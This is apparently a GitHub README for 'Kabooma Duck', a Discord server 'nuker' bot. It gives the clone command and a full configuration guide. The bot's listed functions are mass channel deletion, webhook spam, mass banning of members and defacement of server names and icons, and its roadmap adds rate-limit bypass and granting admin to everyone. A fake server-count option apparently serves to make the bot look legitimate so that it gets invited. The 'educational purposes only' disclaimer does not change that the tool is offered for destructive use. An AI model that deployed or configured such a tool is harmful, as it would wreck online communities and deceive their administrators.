![KaboomaDuck](https://github.com/InternetFelons/kabooma-duck/assets/86261944/a99a1ae4-f701-4a7e-a7ad-17854828996c)
# Kabooma Duck - Discord Nuker
Kabooma Duck is a heavy-hitting and fully customizable Discord Nuker. 

**Note: We do not encourage any malicious use of this bot. Educational Purposes ONLY. We are not responsible for anything you decide to do with this program.** 

    git clone https://github.com/InternetFelons/kabooma-duck.git

## Features
 - Mass channel deletion/creation
 - Mass message/webhook spam
 - Mass banning
 - Server icon, name, banner change
 - FULLY Customizable
### Roadmap
- Mass role deletion
- Give admin to @everyone
- Disable community
- **Bypass rate limits**
- Double Nuking

## Configuration Guide
 ### config.json:

    {
		"token": "BOT TOKEN",
		"clientID": "APPLICATION/CLIENT ID FOUND ON DISCORD DEV PORTAL",
		"admins": ["IDS OF USERS THAT CAN OPEN NUKE PANEL"],
		"botName": "NAME OF THE BOT SET IN THE DISCORD DEV PORTAL",
		"fakeServers": "AMOUNT OF SERVERS THE BOT WILL SHOW IT IS IN",
		"advancedOptions": {...}
	}

 - `token`: string - Bot token, found on the Bot tab of an application, may require 2FA to access.
 - `clientID`: string - Client ID (A.K.A. Application ID) is found in the General Information tab of an application.
 - `admins`: array - User IDs of bot Administrators. These are the people that have access to system commands in Direct Messages.
 - `botName`: string - Name of the bot set in the Developer Portal
 - `fakeServers`: string - Amount of servers the bot will say in it's status. (ex: `Watching 12 servers.`)
 - `advancedOptions`: object - See Below

### config.json/advancedOptions:

    {
		"enabled": false
		
		"channels": {
			"channelNames": "NAME OF CHANNEL THAT WILL BE SPAMMED",
			"amount": 50
		},

		"webhook": {
			"name": "NAME OF BOT THAT WILL SPAM THE CHANNELS",
			"avatar": "AVATAR OF SAID BOT, MUST BE DIRECT LINK",
			"message": "MESSAGE BOT WILL SPAM"
		},

		"banning": {
			"enabled": false,
			"banReason": "REASON FOR BAN"
		},
		
		"server": {
			"nameChange": "CHANGES NAME OF THE SERVER",
			"iconChange": "CHANGES SERVER ICON, MUST BE DIRECT LINK",
			"bannerChange": "CHANGES SERVER BANNER, ONLY WORKS ON LEVEL 2 BOOSTED SERVERS, MUST BE DIRECT LINK"
		},
	}

 - `enabled`: boolean - If set to false, all advanced options will be ignored, and the default settings will be used.
 - `channels`: object - Nests the options for mass channel deletion.
	 -  `channelNames`: string - Name of the new channels that will be created after deletion.
	 - `amount`: integer - Number of channels to create. *This should not be changed.*
- `webhook`: object - Nests options for webhook spam and customization.
	- `name`: string - Name of the webhook
	- `avatar`: string - Direct URL for the webhook's avatar/profile picture.
	- `message`: string - Message that will be spammed in every channel. (ex: `@everyone haha`)
- `banning`: object - Nests the options for banning members.
	- `enabled`: boolean - If set to false, this module will be disabled and will not ban everyone.
	- `banReason`: string - Ban reason that shows for admins in audit logs and bans tab.
- `server`: object - Nests options that change the server details.
    - `nameChange`: string - This will be set as the server's new name.
    - `iconChange`: string - This direct link will be set as the server's new icon.
    - `bannerChange`: string - This direct link will be set as the server's new banner. Option only works on level 2+ boosted servers.

### /otherConfig/defaultAdvanced.json:
*Do not edit this file.*

Default values for config.json/advancedOptions.

    {
    
	"advancedOptions": {

		"channels": {
			"channelNames": "get nuked",
			"amount": 25
		},
		
		"webhook": {
			"name": "Tsar Bomba",
			"avatar": "https://cdn.ratface.lol/r/nuke.png",
			"message": "@everyone"
		},
		
		"banning": {
			"enabled": false,
			"banReason": ""
		},

		"server": {
			"nameChange": "Server Nuked",
			"iconChange": "https://cdn.ratface.lol/r/nuke.png",
			"bannerChange": "https://cdn.ratface.lol/r/nukeBanner.png"
		},
	}
	}

